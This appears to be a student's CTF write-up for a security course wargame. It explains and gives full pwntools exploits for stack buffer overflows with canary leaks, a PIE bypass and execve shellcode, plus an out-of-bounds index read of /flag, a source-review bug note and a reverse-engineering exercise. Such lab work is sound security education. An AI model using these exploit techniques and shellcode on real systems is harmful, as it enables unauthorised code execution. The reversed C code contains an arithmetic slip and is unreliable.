shellcrack
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
Didn't really have any problems with this one.

Script/Command used (Writeup)
------------------
First we are prompted to enter some data in the `vuln` function.
```
push    0x10
push    0x1
lea     eax, [ebp-0x44 {var_48}]
push    eax {var_48} {var_58}
call    fread
```
According to the binary this data entered through `fread` which mandates 0x10 bytes to be read into a buffer at ebp-0x44. So we give it exactly 0x10 bytes of garbage as requested. But then the program returns what we entered plus some extra stuff afterward.
```
mov     eax, dword [ebp-0x44 {var_48}]
mov     dword [ebp-0x24 {var_28}], eax
mov     eax, dword [ebp-0x40 {var_44}]
mov     dword [ebp-0x20 {var_24}], eax
mov     eax, dword [ebp-0x3c {var_40}]
mov     dword [ebp-0x1c {var_20}], eax
mov     eax, dword [ebp-0x38 {var_3c}]
mov     dword [ebp-0x18 {var_1c}], eax
lea     eax, [ebp-0x24 {var_28}]
push    eax {var_28} {var_4c_3}
lea     eax, [ebx-0x1604]  {data_9a8, "This is the 6447 wargaming gatew…"}
push    eax  {data_9a8, "This is the 6447 wargaming gatew…"}
call    printf
```
From the binary we see that our input at ebp-0x44 was shifted down to ebp-0x24, and then ebp-0x24 is used as the address for the `printf` call. However since we didn't null terminate the data we entered earlier, some more things are printed off the stack.
```
push    0x8
lea     eax, [ebx+0x60]  {global_canary}
push    eax  {global_canary}
lea     eax, [ebp-0x14 {var_18}]
push    eax {var_18} {var_54}
call    strncpy

```
If we look further up in the `vuln` function, we see that that extra data was actually the 8 byte stack canary copied into ebp-0x14 (conveniently 0x10 below the stack buffer printed out). So we take the first 8 bytes we receive after what was our input and this is the stack canary.

Next the program gives us a buffer pointer, which we can then write to
```
lea     eax, [ebp-0x44 {var_48}]
push    eax {var_48} {var_4c_4}
lea     eax, [ebx-0x15d8]  {data_9d4, "Write your data to the buffer[%p…"}
push    eax  {data_9d4, "Write your data to the buffer[%p…"}
call    printf
```
This is a pointer to the same buffer used earlier at ebp-0x44. With this information we can make a payload for a buffer overflow that consists of shellcode to pop a shell, some padding, the canary we extracted earlier, some more padding, then overwrite the return address to the buffer where our shellcode will be executed.

Exploit:
```
from pwn import *

p = remote('plsdonthaq.me', 5001)
#p = process('./shellcrack')

p.sendline(b'A'*0xF) #15 A's and a \n so 16 bytes sent

p.recvuntil('This is the 6447 wargaming gateway, ')

p.recvline()
canary = p.recvline().rstrip()[:8]
match = re.search(r'0x[\da-f]+', p.recvline().rstrip().decode())
ebp_0x44 = int(match.group(), 16)


shellcode = asm(""" xor eax, eax
                    xor ecx, ecx
                    xor edx, edx
                    push ecx
                    push 0x68732f2f
                    push 0x6e69622f
                    mov al, 0x0b
                    mov ebx, esp
                    int 0x80 """)
precanary_padding = b'A'*(0x44-0x14 - len(shellcode))
postcanary_padding = b'A'*(0x14-0x8+0x4)

payload = shellcode + precanary_padding + canary + postcanary_padding + p32(ebp_0x44)

p.sendline(payload)

p.interactive()
```

stack-dump2
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
I initially struggled to overcome the PIE protection in order to get the address of the `win` function. I was initially trying to get an ebx-relative address off the stack and then using some other offsets try and derive the `win` function but that wouldn't work. So unlike in the original `stackdump`, I actually used the "print memory map" functionality to get the base address of the code segment which worked more reliably.

Script/Command used (Writeup)
------------------
All protections are enabled but we are given a stack pointer. As with the original stackdump challenge we can dump some memory to leak the stack canary, and then we will look to do a buffer overflow to overwrite the return address of `main` to `win`.
```
lea     eax, [ebp-0x71 {var_75}]
push    eax {var_75} {var_80}
lea     eax, [ebx-0x14d8]  {data_ad0, "To make things easier, here's a …"}
push    eax  {data_ad0, "To make things easier, here's a …"}
call    printf
```
We get given a userful stack pointer which is convenient. This address is ebp-0x71.
```
mov     eax, dword [gs:0x14]
mov     dword [ebp-0x8 {var_c}], eax
```
The stack canary is kept at ebp-0x8. Now that we have ebp-0x71 we can work out what address this is and enter it in the "input data". We set length of input to 6 to account for the 4 bytes of the address, 1 byte for the newline character, and 1 byte for null terminator added by `fgets`.

After this we dump the memory at this address. Since 0x16 bytes are outputted, we just take the first 4 bytes returned and thats the canary.

Now that we have the canary, we need to get the address of the `win` function. We do this by printing the memory map:
```
56615000-56616000 r-xp 00000000 08:01 8756
```
the first line should start with something like the above. The very first value is the base of the code segment, so in this case 0x56615000. To get the `win` address from this value we add it's offset in the vinary which is 0x076d.

Next we need to input our buffer overflow payload. Bearing in mind that the input buffer starts at ebp-0x68, we need a length of 0x72. We use 0x60 bytes of padding, then the stack canary (starting at ebp-0x8), then 8 more bytes of padding, the `win` address (starting at ebp+0x4) and then a newline character, and the null terminator added on by `fgets`.

Exploit:
```
from pwn import *

p = remote('plsdonthaq.me', 5002)
#p = process('./stack-dump2')

p.recvuntil('stack pointer ')

ebp_0x71 = int(p.recvline().rstrip(), 16)
ebp = ebp_0x71 + 0x71

p.recvlines(4)

p.sendline('a')

## leak canary
# length is 4bytes of address + \n + \x00
p.sendlineafter('len: ', b'6')
# canary is kept at ebp-0x8
p.sendline(p32(ebp-0x8))
p.recvlines(6)
p.sendline('b')
p.recvuntil(': ')
canary = p.recvline().rstrip()[:4]
p.recvlines(4)

## leak code segment base addr

p.sendline(b'c')
base_addr = b'0x'+p.recvuntil('-',drop=True)
win_addr = int(base_addr, 16) + 0x076d

## buffer overflow

p.sendlineafter('d) quit\n', b'a')
# buffer at 0x68, +0x8 to account for return addr from ebp+0x4 to ebp+0x8
# and +0x2 to account for the \n and added null terminator
p.sendlineafter('len: ', str(0x68+0x8+0x2).encode())

precanary_padding = b'A'*0x60
postcanary_padding = b'A'*0x8
payload = precanary_padding + canary + postcanary_padding + p32(win_addr)

p.sendline(payload)
p.recvlines(6)
p.sendline(b'd')

p.interactive()
```

image-viewer
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
The hardest part about this challenge was working out what could be exploited. I instantly identified atoi() as the vulnerability, but I couldn't work out how to abuse it. From what I saw online it was commonly used for integer overflow/underflow exploits but that didn't apply here. I also knew that if a text string was passed into atoi(), it would return 0 but again that wasn't of much use to me. After leaving it for a couple of days when I came back I tried entering a number followed by text and surprisingly it converted the number and just ignored the rest. After this it was clear that I could abuse the images indexing to access memory in the input buffer that I am in control of.

Script/Command used (Writeup)
------------------
We'll make a payload that starts with an index number and then text and then the rest of the payload. That way `atoi` just parses the initial index number but we can keep a whole payload for later use. Let's first look how the array of structs are handled in the binary:
```
call    read_input
sub     esp, 0xc
push    buf  {"empty"}
call    atoi
add     esp, 0x10
mov     edx, dword [eax*8+0x804c0e4]
mov     eax, dword [eax*8+0x804c0e0]
```
The result of `atoi` (which is the index i) is multiplied by 8 (size of each struct) and added to the base of the array 0x804c0e0 to get images[i].id. Since the filename is offset 4 bytes from the id, the base for filename is treated as 0x804c0e4 (&images[0].filename). In the binary we see that the input buffer (size 128 bytes) starts at address 0x0804x060, so we need to pick some index that gets use near there. -15 x 8 + 0x0804x0e0 is 0x0804c068. So we'll use -15 as our index.

Our payload will start with 8 bytes "-15xxxxx" where `atoi` stops after -15 and then we pad until we reach 0x0804c068. Then we need to put the same id here, so we'll add the 4 bytes "-15x". Now we need to add images[-15].filename in the next 4 bytes which should be a pointer to the filename string. Bearing in mind we are now at address 0x0804c06c, we can make our 4 byte pointer 0x0804c070 and then right after this write our string.

We know we want to open "flat earth truth" but to ensure the `strcmp` fails we'll use the filename "./flat earth truth". After this we see we actually need to open /flag so we do that instead.

Exploit:
```
from pwn import *

p = remote('plsdonthaq.me', 5003)
#p = process('./image-viewer')

p.sendlineafter("> ", "trivial")
#&(images[i].id) = i*8 + 0x0804c0e0 (base of images array)
#&(images[i].filename) = i*8 + 0x0804c0e0 + 0x4 (offset 4 from base of struct)
#buf is across 0x0804c060 to 0x0804c0e0
#index -15 is at address 0x0804c068
#so we want to specify id -15x (-15 terminated) and then pad 4 bytes
payload = b'-15x'
payload += b'xxxx'
#then we add the id again which gets read in by images[-15].id
payload += p32(-15, sign=True)
#at this point we have filled data until 0x0804c06c
#we will then add a pointer here to 0x0804c070
payload += p32(0x0804c070)
#we are now at 0x0804c070 which the above pointer points to so here we write the file to open
#the ./ makes the file look different, passing the check
#payload += b'./flat earth truth'
#flat earth truth revealed the flag is in /flag
payload += b'./flag'


p.sendlineafter("> ", payload)
p.interactive()
```
src challenge
=================
General overview of problems faced
--------------------------------------
lines: Bug
97: lack of sanitization of the `action` string. As a result directory traversal (with ../) is possible with the risk of leaking information.

re (reverse engineering challenge)
===========================

General overview of problems faced
-------------------------------------
The main problem here was working out what all the multiplication and right shift was doing. I came to understand that I was dealing with optimised assembly code, but it was hard to work out what it was an optimisation of. Particularly what was throwing me off was the constant value 0x2aaaaaab. After enough complicated google search queries I found something which somewhat resembled the structure of the code (containing a weird hex value, imul, sar and sub), and was able to look more into how signed integer division worked (which was actually pretty interesting).

Reversed C Code
------------------
NOTE: I was wrong about this and it was just modulo lol
```
int re_this(int arg1, int arg2) {
    return (arg1+arg2) - 10*((arg1+arg2)/6);
}
```

Below is my chain of working to get from low level to higher level.

```
re_this(arg1, arg2) {
    edx = arg1
    eax = arg2
    ecx = edx + eax = arg1 + arg2
    edx = 0x2aaaaab
    eax = ecx = arg1 + arg2
    edx:eax = edx*eax = 0x2aaaaaab * (arg1 + arg2)
    eax = ecx = arg1+arg2
    eax = eax >> 31 = (arg1+arg2) >> 31
    edx = edx - eax = edx - (arg1+arg2) >> 31
    eax = edx
    eax = 10eax
    ecx = ecx - eax
    edx = ecx
    eax = edx
    return eax
}
```
```
re_this(arg1, arg2) {
    ecx = arg1+arg2
    edx = 0x2aaaaab
    eax = arg1+arg2
    edx:eax = edx*eax = 0x2aaaaaab*(arg1+arg2)
    eax = (arg1+arg2) >> 31
    edx = edx-eax = edx - ((arg1+arg2) >> 31)
    ecx = ecx - 10edx
    return ecx
}
```
However this is still quite non-readable. But, thanks to stackoverflow, it started to make sense that the complicated stuff at the beginning was an implementation of signed division: https://stackoverflow.com/questions/5558492/divide-by-10-using-bit-shifts/5558614#5558614
```
int re_this(int arg1, int arg2) {
    ecx = arg1+arg2
    edx = 0x2aaaaab = 1/6 * 2^32 #rounded up
    eax = arg1+arg2
    edx:eax = edx*eax = (arg1+arg2)/6 * 2^32 #so the division result is shifted into edx
    eax = (arg1+arg2) >> 31 # will be 1 or -1 depending on sign bit
    edx = edx-eax = edx - ((arg1+arg2) >> 31) # account for rounding toward -INF due to sar
    ecx = ecx - 10edx
    return ecx
}
```
```
int re_this(int arg1, int arg2) {
    int ecx = arg1+arg2
    int edx = ecx / 6;
    int ecx = ecx - 10*edx
    return ecx
}
```
